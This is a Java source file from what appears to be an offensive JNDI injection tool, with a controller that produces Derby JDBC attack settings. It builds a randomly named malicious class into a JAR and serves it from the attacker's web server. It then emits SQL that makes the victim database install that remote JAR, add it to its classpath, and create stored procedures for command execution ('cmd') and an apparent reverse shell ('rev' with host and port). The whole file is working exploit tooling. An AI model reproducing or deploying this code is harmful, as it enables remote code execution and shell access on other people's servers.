package com.h2tg.ysogate.controller.jdbc;

import com.h2tg.ysogate.config.JndiConfig;
import com.h2tg.ysogate.utils.RandomUtils;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import com.h2tg.ysogate.annotation.JNDIMapping;
import com.h2tg.ysogate.controller.DatabaseController;
import com.h2tg.ysogate.exploit.server.WebServer;
import com.h2tg.ysogate.template.DerbyJarTemplate;
import com.h2tg.ysogate.utils.JarUtils;
import java.util.Properties;

public abstract class SingleCommandController extends DatabaseController {
    private static final String className = RandomUtils.getRandStr(12);

    @JNDIMapping("/Derby/Install/{database}")
    public Properties derbyInstall(String database) {
        // HikariCP 和 TomcatJDBC 仅能执行单条 SQL 语句
        throw new RuntimeException("Not implemented");
    }

    @JNDIMapping("/Derby/InstallJar/{database}")
    public Properties derbyInstallJar(String database) throws Exception {
        System.out.println("[Derby] [InstallJar] Database: " + database);

        String url = "jdbc:derby:memory:" + database + ";create=true";

        ClassPool pool = ClassPool.getDefault();
        CtClass clazz;

        try {
            clazz = pool.get(className);
        } catch (NotFoundException e) {
            clazz = pool.get(DerbyJarTemplate.class.getName());
            clazz.replaceClassName(clazz.getName(), className);
        }

        byte[] jarBytes = JarUtils.create(className, clazz.toBytecode());
        WebServer.getInstance().serveFile("/" + className + ".jar", jarBytes);

        String sql = "CALL SQLJ.INSTALL_JAR('" + JndiConfig.codebase + className + ".jar', 'APP." + className + "', 0)";

        Properties props = new Properties();
        props.setProperty("driver", "org.apache.derby.jdbc.EmbeddedDriver");
        props.setProperty("url", url);
        props.setProperty("sql", sql);

        return props;
    }

    @JNDIMapping("/Derby/AddClassPath/{database}")
    public Properties derbyAddClassPath(String database) {
        System.out.println("[Derby] [AddClassPath] Database: " + database);

        String url = "jdbc:derby:memory:" + database + ";create=true";
        String sql = "CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath', 'APP." + className + "')";

        Properties props = new Properties();
        props.setProperty("driver", "org.apache.derby.jdbc.EmbeddedDriver");
        props.setProperty("url", url);
        props.setProperty("sql", sql);

        return props;
    }

    @JNDIMapping("/Derby/CreateCmdProc/{database}")
    public Properties derbyCreateCmdProc(String database) {
        System.out.println("[Derby] [CreateCmdProc] Database: " + database);

        String url = "jdbc:derby:memory:" + database + ";create=true";
        String sql = "CREATE PROCEDURE cmd(IN cmd VARCHAR(255)) PARAMETER STYLE JAVA READS SQL DATA LANGUAGE JAVA EXTERNAL NAME '" + className + ".exec'";

        Properties props = new Properties();
        props.setProperty("driver", "org.apache.derby.jdbc.EmbeddedDriver");
        props.setProperty("url", url);
        props.setProperty("sql", sql);

        return props;
    }

    @JNDIMapping("/Derby/CreateRevProc/{database}")
    public Properties derbyCreateRevProc(String database) {
        System.out.println("[Derby] [CreateRevProc] Database: " + database);

        String url = "jdbc:derby:memory:" + database + ";create=true";
        String sql = "CREATE PROCEDURE rev(IN host VARCHAR(255), IN port VARCHAR(255)) PARAMETER STYLE JAVA READS SQL DATA LANGUAGE JAVA EXTERNAL NAME '" + className + ".rev'";

        Properties props = new Properties();
        props.setProperty("driver", "org.apache.derby.jdbc.EmbeddedDriver");
        props.setProperty("url", url);
        props.setProperty("sql", sql);

        return props;
    }
}
